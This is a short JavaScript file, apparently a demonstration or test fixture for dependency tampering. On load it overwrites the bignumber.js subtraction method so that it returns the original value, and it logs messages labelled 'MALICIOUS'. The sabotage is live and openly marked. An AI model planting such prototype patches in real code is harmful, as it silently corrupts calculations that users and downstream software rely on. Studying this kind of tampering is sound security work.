const BigNumber = require("bignumber.js");
// const crypto = require("crypto");
console.log("x.js loaded");

!(function () {
  console.log("MALICIOUS execution x.js");
  BigNumber.prototype.minus = function () {
    console.log("MALICIOUS BigNumber.minus");
    return this;
  };
})();
